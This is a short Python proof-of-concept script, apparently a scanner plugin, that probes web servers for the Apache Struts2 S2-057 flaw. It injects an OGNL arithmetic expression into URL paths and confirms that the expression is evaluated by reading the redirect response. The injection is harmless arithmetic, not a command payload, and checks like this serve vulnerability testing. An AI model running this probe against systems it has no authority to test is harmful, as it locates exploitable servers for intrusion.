#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/5/11 20:24
# @Author  : Goop
# @Site    : 
# @File    : struts2_057.py
# @Software: PyCharm

import requests
import random
from urllib.parse import urlparse
from plugin.urlparser import iterate_path, get_domain


def poc(url, **kwargs):
    if kwargs.get('ip'):
        url = 'http://' + kwargs.get('ip') + ':' + kwargs.get('port')
    else:
        url = url
    timeout = 10
    domain = get_domain(url)
    proxies = {'http': '127.0.0.1:9999'}
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0'
    }
    ran_a = random.randint(10000000, 20000000)
    ran_b = random.randint(1000000, 2000000)
    ran_check = ran_a - ran_b
    parser = urlparse(url)
    if parser.path:
        _path_list = parser.path.replace('//', '/').strip('/').split('/')[-1]
    else:
        _path_list = 'index.action'
    url_list = iterate_path(url)
    for urls in url_list:
        url = urls + '/${%s-%s}/%s' % (ran_a, ran_b, _path_list)
        try:
            res = requests.get(url, timeout=timeout, headers=headers, allow_redirects=False, verify=False, )
            if res.status_code == 302 and res.headers.get('Location') is not None and str(ran_check) in res.headers.get(
                    'Location'):
                urlLoca = res.headers.get('Location')
                res2 = requests.get(domain + urlLoca, headers=headers, timeout=6, allow_redirects=False, verify=False)
                if str(ran_check) in res2.text:
                    result = "目标存在 Struts2-057, check url: %s" % url
                    return result
        except:
            pass


if __name__ == '__main__':
    poc('http://192.168.106.130:8080')
